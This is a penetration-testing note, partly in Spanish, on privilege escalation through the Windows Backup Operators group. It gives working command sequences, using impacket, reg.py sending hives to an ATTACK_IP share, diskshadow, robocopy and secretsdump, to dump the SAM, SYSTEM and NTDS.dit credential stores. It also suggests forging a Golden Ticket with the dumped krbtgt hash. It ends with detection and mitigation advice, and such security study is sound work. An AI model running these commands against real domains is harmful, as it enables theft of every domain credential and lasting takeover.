---
title: Backup Operators Group
draft: false
tags:
---
 
This technique allows a domain user who belongs to the Backup Operators group to dump the DC SAM, SYSTEM and SECURITY hives and extract all the user hashes.

Check [[Local Windows Credentials]] or [[Locally Stored Credentials]] for more information.

Reference: https://r00tven0m.github.io/posts/Domain-Privilege-Escalation-Backup-Operators-Group/

> [!Requirements]
> A domain user that is a member of the **Backup Operators** group on the Domain Controller (or any target). Membership grants the `SeBackupPrivilege` and `SeRestorePrivilege`, which let us read any file on the system — including the registry hives and `NTDS.dit` — regardless of DACLs. No local admin is required.

# Linux

1. Create an SMB share:
```bash
$ impacket-smbserver test $(pwd) -smb2support
```

2. Using [reg.py](https://github.com/horizon3ai/backup_dc_registry/blob/main/reg.py "reg.py")[](https://r00tven0m.github.io/posts/Domain-Privilege-Escalation-Backup-Operators-Group/#aonther-way-attacking-a-domain-controller--with--regpy) dump the hives:
```bash
python3 reg.py USER:'PASSWORD'@DC_FQDN backup -p '\\ATTACK_IP\test'
```

3. Dump the credentials locally:
```bash
$ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
```


# Windows

1. Dump the credentials:
```powershell
C:\> reg save HKLM\SAM C:\Windows\Temp\SAM
C:\> reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
```

2. Check credentials:
```
impacket-secretsdump -sam SAM -system SYSTEM local
```

> [!Info] ¿Por qué funciona?
> `SeBackupPrivilege` permite abrir cualquier fichero con el flag `FILE_FLAG_BACKUP_SEMANTICS`, saltándose la ACL. Con esto podemos copiar las ramas del registro (`SAM`, `SYSTEM`, `SECURITY`) para extraer las credenciales locales, o directamente el fichero `NTDS.dit` de un DC para volcar **todos** los hashes del dominio (equivalente offline a un [[AD DCSync]]).

# Windows — NTDS.dit vía diskshadow (DC)

En un Domain Controller el `NTDS.dit` está bloqueado por el proceso `lsass`/`ntds`, así que no se puede copiar directamente. Usamos una shadow copy con `diskshadow` y luego `robocopy` con el flag de backup:

1. Crear un script para `diskshadow`:
```cmd
C:\> echo set context persistent nowriters > script.txt
C:\> echo add volume c: alias cdrive >> script.txt
C:\> echo create >> script.txt
C:\> echo expose %cdrive% z: >> script.txt
C:\> diskshadow /s script.txt
```

2. Copiar `NTDS.dit` desde la shadow copy usando `SeBackupPrivilege` (robocopy /b):
```cmd
C:\> robocopy /b z:\Windows\NTDS . ntds.dit
```

3. Exportar la rama SYSTEM (contiene la boot key necesaria para descifrar el NTDS):
```cmd
C:\> reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

4. Volcar todos los hashes del dominio offline con [[Impacket]]:
```bash
$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

> [!Tip]
> Alternativa a `robocopy /b`: el módulo PowerShell **`SeBackupPrivilegeCmdLets`** + **`SeBackupPrivilegeUtils`** (dinwwwh) expone `Copy-FileSeBackupPrivilege ntds.dit C:\Temp\ntds.dit`. También existe `wbadmin.exe` para crear un backup del volumen de sistema y recuperar el NTDS/SYSTEM desde él.

> [!Tip]
> El hash de **krbtgt** sale en este volcado — con él puedes forjar un [[Golden Ticket]] y persistir en el dominio.

# Detección y mitigación

- **Detección**: Event ID `4672` (Special privileges assigned — `SeBackupPrivilege`) en logons interactivos no esperados; creación de shadow copies (`diskshadow`/`vssadmin`) fuera de ventanas de backup; acceso a `\Windows\NTDS\ntds.dit`. Monitorizar membresías del grupo Backup Operators (`4728`/`4732`/`4756`).
- **Mitigación**: tratar Backup Operators como grupo *tier-0* (protegido como Domain Admins); limitar su membresía; usar cuentas de servicio gestionadas y gMSA para los backups; habilitar Credential Guard para reducir el valor de los hashes extraídos.

### Related notes
- [[AD DCSync]] — alternativa online para volcar hashes del dominio (replicación DRSUAPI).
- [[AD Enumerating Groups]] — cómo descubrir que tu usuario pertenece a Backup Operators.
- [[Windows Dumping and Cracking Credentials]] — crackear los hashes obtenidos.
- [[Locally Stored Credentials]] / [[Local Windows Credentials]] — extracción de SAM/SYSTEM/SECURITY.
- [[Golden Ticket]] — persistencia usando el hash de krbtgt del volcado.
